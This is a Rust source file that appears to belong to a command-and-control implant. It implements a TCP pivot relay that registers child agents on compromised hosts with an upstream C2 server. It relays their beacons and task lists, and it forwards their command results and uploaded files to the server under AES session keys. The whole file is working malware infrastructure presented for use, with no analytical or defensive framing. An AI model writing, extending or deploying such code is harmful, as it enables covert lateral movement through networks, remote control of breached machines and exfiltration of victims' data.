#![allow(dead_code)]
/// TCP pivot relay server.
/// Child agents connect via TCP using 4-byte LE length-prefix framing.
/// Handles register/beacon/result/upload by relaying to the real C2.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Mutex, OnceLock};
use base64::{engine::general_purpose::STANDARD, Engine as _};

static TCP_PIVOT_STOP: AtomicBool = AtomicBool::new(true);
static TCP_PIVOT_AGENT_ID: OnceLock<Mutex<String>> = OnceLock::new();

fn pivot_agent_id() -> std::sync::MutexGuard<'static, String> {
    TCP_PIVOT_AGENT_ID.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
}

pub fn set_tcp_pivot_agent_id(id: &str) {
    *pivot_agent_id() = id.to_string();
}

fn read_frame(stream: &mut TcpStream) -> Option<Vec<u8>> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).ok()?;
    let frame_len = u32::from_le_bytes(len_buf) as usize;
    if frame_len > 4 * 1024 * 1024 { return None; }
    let mut frame = vec![0u8; frame_len];
    stream.read_exact(&mut frame).ok()?;
    Some(frame)
}

fn write_frame(stream: &mut TcpStream, data: &[u8]) -> bool {
    let len = (data.len() as u32).to_le_bytes();
    stream.write_all(&len).is_ok() && stream.write_all(data).is_ok()
}

fn do_request(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
    let agent_id = pivot_agent_id().clone();
    let extra = format!("X-C2-Parent: {}\r\n", agent_id);
    crate::transport::http_do_with_header(method, path, body, &extra)
}

fn handle_tcp_client(mut client: TcpStream) {
    let reg_raw = match read_frame(&mut client) { Some(d) => d, None => return };
    let msg: serde_json::Value = match serde_json::from_slice(&reg_raw) { Ok(v) => v, Err(_) => return };
    if msg.get("t").and_then(|v| v.as_str()) != Some("register") { return; }
    let payload = match msg.get("p") { Some(p) => p.clone(), None => return };
    let mut reg_map = serde_json::json!({
        "hostname":     payload.get("hostname").and_then(|v| v.as_str()).unwrap_or(""),
        "username":     payload.get("username").and_then(|v| v.as_str()).unwrap_or(""),
        "os":           payload.get("os").and_then(|v| v.as_str()).unwrap_or("windows"),
        "pid":          payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0),
        "transport":    "tcp",
        "sleep_sec":    payload.get("sleep_sec").and_then(|v| v.as_i64()).unwrap_or(60),
        "jitter_pct":   payload.get("jitter_pct").and_then(|v| v.as_i64()).unwrap_or(20),
        "process_name": payload.get("process_name").and_then(|v| v.as_str()).unwrap_or(""),
        "is_admin":     payload.get("is_admin").and_then(|v| v.as_bool()).unwrap_or(false),
        "language":     payload.get("language").and_then(|v| v.as_str()).unwrap_or("rust"),
    });
    let pid_str = pivot_agent_id().clone();
    if !pid_str.is_empty() {
        reg_map["parent_id"] = serde_json::Value::String(pid_str);
    }
    let reg_body = reg_map.to_string();
    let (reg_status, reg_resp_raw) = match do_request("POST", "/register", reg_body.as_bytes()) {
        Some(r) => r,
        None => return,
    };
    if reg_status != 200 || reg_resp_raw.is_empty() { return; }
    let reg_resp: serde_json::Value = match serde_json::from_slice(&reg_resp_raw) { Ok(v) => v, Err(_) => return };
    let agent_id  = match reg_resp.get("agent_id").and_then(|v| v.as_str()) { Some(s) => s.to_string(), None => return };
    let aes_key_b64 = match reg_resp.get("aes_key").and_then(|v| v.as_str()) { Some(s) => s.to_string(), None => return };
    let aes_key = match STANDARD.decode(&aes_key_b64) { Ok(k) => k, Err(_) => return };
    let resp_msg = serde_json::json!({"t": "register_resp", "p": reg_resp});
    if !write_frame(&mut client, resp_msg.to_string().as_bytes()) { return; }
    loop {
        if TCP_PIVOT_STOP.load(Ordering::Relaxed) { break; }
        let frame = match read_frame(&mut client) { Some(f) => f, None => break };
        let fmsg: serde_json::Value = match serde_json::from_slice(&frame) { Ok(v) => v, Err(_) => break };
        match fmsg.get("t").and_then(|v| v.as_str()).unwrap_or("") {
            "beacon" => {
                let (b_status, b_data) = do_request("GET", &format!("/beacon/{}", agent_id), &[])
                    .unwrap_or((0, vec![]));
                if b_status == 204 || b_data.is_empty() {
                    let empty_plain = b"{\"tasks\":[]}";
                    let enc = crate::crypto::seal(&aes_key, empty_plain);
                    let enc_b64 = STANDARD.encode(&enc);
                    let resp = serde_json::json!({"t": "tasks", "p": enc_b64});
                    if !write_frame(&mut client, resp.to_string().as_bytes()) { break; }
                } else {
                    let enc_b64 = STANDARD.encode(&b_data);
                    let resp = serde_json::json!({"t": "tasks", "p": enc_b64});
                    if !write_frame(&mut client, resp.to_string().as_bytes()) { break; }
                }
            }
            "result" => {
                let enc_b64 = fmsg.get("p").and_then(|v| v.as_str()).unwrap_or("");
                let enc_data = STANDARD.decode(enc_b64).unwrap_or_default();
                if !enc_data.is_empty() {
                    let _ = do_request("POST", &format!("/result/{}", agent_id), &enc_data);
                }
                let ack = serde_json::json!({"t": "ack"});
                if !write_frame(&mut client, ack.to_string().as_bytes()) { break; }
            }
            "upload" => {
                let enc_b64 = fmsg.get("p").and_then(|v| v.as_str()).unwrap_or("");
                let enc_data = STANDARD.decode(enc_b64).unwrap_or_default();
                if !enc_data.is_empty() {
                    if let Some(plain) = crate::crypto::open(&aes_key, &enc_data) {
                        if let Ok(uj) = serde_json::from_slice::<serde_json::Value>(&plain) {
                            let task_id = uj.get("task_id").and_then(|v| v.as_i64()).unwrap_or(0);
                            let fname   = uj.get("filename").and_then(|v| v.as_str()).unwrap_or("file");
                            let fdata_b64 = uj.get("data").and_then(|v| v.as_str()).unwrap_or("");
                            let fdata = STANDARD.decode(fdata_b64).unwrap_or_default();
                            let upload_path = format!("/upload/{}?task_id={}&filename={}", agent_id, task_id, fname);
                            let _ = do_request("POST", &upload_path, &fdata);
                        }
                    }
                }
                let ack = serde_json::json!({"t": "ack"});
                if !write_frame(&mut client, ack.to_string().as_bytes()) { break; }
            }
            _ => {}
        }
    }
}

pub fn start_tcp_pivot(port: u16) -> String {
    if !TCP_PIVOT_STOP.swap(false, Ordering::Relaxed) {
        return "[-] TCP pivot already running".to_string();
    }
    let listener = match TcpListener::bind(format!("0.0.0.0:{}", port)) {
        Ok(l) => l,
        Err(e) => {
            TCP_PIVOT_STOP.store(true, Ordering::Relaxed);
            return format!("[-] TCP pivot: bind failed: {}", e);
        }
    };
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            if TCP_PIVOT_STOP.load(Ordering::Relaxed) { break; }
            match stream {
                Ok(s) => { std::thread::spawn(|| handle_tcp_client(s)); }
                Err(_) => break,
            }
        }
        TCP_PIVOT_STOP.store(true, Ordering::Relaxed);
    });
    format!("[+] TCP pivot started on port {}", port)
}

pub fn stop_tcp_pivot() -> &'static str {
    if TCP_PIVOT_STOP.load(Ordering::Relaxed) { return "[-] TCP pivot not running"; }
    TCP_PIVOT_STOP.store(true, Ordering::Relaxed);
    "[+] TCP pivot stopped"
}
